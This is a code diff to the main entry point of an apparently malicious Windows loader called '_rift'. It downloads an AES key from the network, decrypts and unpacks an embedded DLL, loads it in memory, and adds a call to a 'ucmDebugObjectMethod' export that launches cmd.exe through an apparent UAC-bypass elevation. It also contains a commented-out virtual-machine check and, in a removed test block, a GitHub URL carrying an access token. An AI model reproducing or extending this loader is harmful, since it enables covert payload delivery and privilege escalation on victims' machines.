@@ -3,6 +3,9 @@
 
 PVOID IDownloadKey();
 
+typedef BOOL(*pEDllInit)(PPIB);
+typedef NTSTATUS(*ucmDebugObjectMethod)(_In_ LPWSTR lpszPayload);
+
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
@@ -26,47 +29,27 @@ INT WINAPI wWinMain(
 #endif
 	EXoshiroBegin();
 
-	{	// Test base64
-		PVOID string = AllocMemory(259, 0);
-		for (int i = 0; i < 259; i++)
-			((PBYTE)string)[i] = (BYTE)(EXoshiroP() >> 24);
-		CopyMemory(string, "https://raw.githubusercontent.com/Lima-X-Coding/Win32._rift/master/_rift/main.c?token=AISLTIFBLEXNHDBHX6Z2FOS63QJ3U", 116);
-		EMd5HashBegin();
-		PVOID hash = EMd5HashData(string, 4);
-
-		SIZE_T bout;
-		PVOID base = EBase64Encode(string, 116, &bout);
-		FreeMemory(string);
-		PVOID base2 = EBase64Decode(base, bout, &bout);
-		FreeMemory(base);
-
-		PVOID hash2 = EMd5HashData(base2, 4);
-		FreeMemory(base2);
-		BOOL test = EMd5Compare(hash, hash2);
-
-		FreeMemory(hash);
-		FreeMemory(hash2);
-	}
+	// init con
+	// IOpenConsole();
+	// BOOL bVM = ICheckVmPresent();
 
 	PVOID pWKey = IDownloadKey();
 	if (!pWKey) {
 		PWSTR szKeyBlob = (PWSTR)AllocMemory(MAX_PATH, 0);
-		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"..\\RIFTWKEY"); // Temporery
+		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
 	}
 	EAesCryptBegin();
 	IAesLoadWKey(pWKey);
 
-	// init con
-	IOpenConsole();
-
-	BOOL bVM = ICheckVmPresent();
-
+	EDecompressBegin();
+	EMd5HashBegin();
 	SIZE_T nDll;
 	PVOID pDll = EUnpackResource(IDR_RIFTDLL, &nDll);
-	EAesCryptEnd();
 	EMd5HashEnd();
+	EDecompressEnd();
+	EAesCryptEnd();
 	if (!pDll)
 		return 0x1;
 
@@ -76,8 +59,8 @@ INT WINAPI wWinMain(
 	if (!hDll)
 		return 0x2;
 
-	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
-	int a = fnDllInit(10);
+	pEDllInit EDllInit = (pEDllInit)MemoryGetProcAddress(hDll, "EDllInit");
+	int a = EDllInit(10);
 
 	MemoryFreeLibrary(hDll);
 #else
@@ -85,8 +68,12 @@ INT WINAPI wWinMain(
 	if (!dhDll)
 		return 0x2;
 
-	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
-	int a = fnDllInit(10);
+	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
+	BOOL bTest = EDllInit(g_PIB);
+
+	ucmDebugObjectMethod Elevate = (ucmDebugObjectMethod)GetProcAddress(dhDll, "ucmDebugObjectMethod");
+	WCHAR payload[] = L"C:\\WINDOWS\\system32\\cmd.exe";
+	Elevate(payload);
 
 	FreeLibrary(dhDll);
 #endif
@@ -94,9 +81,10 @@ INT WINAPI wWinMain(
 	FreeMemory(pDll);
 
 	{	// CleanUp
+		EXoshiroEnd();
+
 		HANDLE hPH = GetProcessHeap();
 		HeapFree(hPH, 0, g_PIB);
-
 	} return 0;
 }
 
@@ -124,7 +112,13 @@ PVOID IDownloadKey() {
 	InternetCloseHandle(hUrl);
 	InternetCloseHandle(hNet);
 
+	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
+		goto EXIT;
+
 	return pBuffer;
+EXIT:
+	FreeMemory(pBuffer);
+	return 0;
 }
 
 
